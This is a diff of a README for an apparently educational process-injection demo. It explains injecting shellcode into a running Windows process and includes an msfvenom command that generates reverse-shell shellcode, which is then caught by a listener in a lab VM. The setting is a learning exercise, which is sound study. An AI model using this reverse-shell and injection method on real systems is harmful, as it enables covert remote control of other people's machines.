@@ -1,13 +1,13 @@
-# SimpleTAI
+# SimpleTPI
 
 writing these materials for myself and for educational purposes .i will write long explanetion about every line of code for better understanding ..
 
 
-so what is thread access injection ? 
+so what is thread Process injection ? 
 
-Thread execution hijacking is a method used to control a running thread in a process. It starts by opening access to a process , the process i demonsrate be claculator .. , then allocating memory within the process, writing malicious code (payload) into the allocated memory, creating a new thread in the process and run it with the malicious code. This will cause the code to take control of the thread.
+TPI is a technique that allows an attacker to inject code into a running process and create a new thread that will execute the injected code. The goal of the attacker with this technique is to take control of the process . This is often used hard to detection, as the injected code runs within the context of a legitimate process and "hide" into the stack, making it difficult for security software to detect. 
 
-we test the script by create a vm in my case is kali linux . 
+i will run the script by create a vm in my case is kali linux . 
 
 in the console we type the command below
 
@@ -30,7 +30,7 @@ msfvenom -p windows/×64/shell_reverse_tc LHOST=xx.xx.xxx.xx LPORT=4444 -f c
 ```
 then we have the shell code 
 
-and we will insert it to ``` shellcode[] = {`here`}```
+and we will insert it in the line of code - ``` shellcode[] = {`here`}```
 
 ![Screenshot 2023-01-24 at 10 50 42](https://user-images.githubusercontent.com/122444563/214353717-a4f88edd-6681-48d0-bb67-f75a74b88bd6.png)
 
@@ -46,6 +46,8 @@ change back to the vm and listen to the port we specify
 Execute the program and our "hacker station" and we are in
 
 <img width="552" alt="Screenshot 2023-01-24 at 13 58 20" src="https://user-images.githubusercontent.com/122444563/214379873-a32fb0de-24e1-4a36-a9fe-b880ea83f9e0.png">
+
+
 
 
 
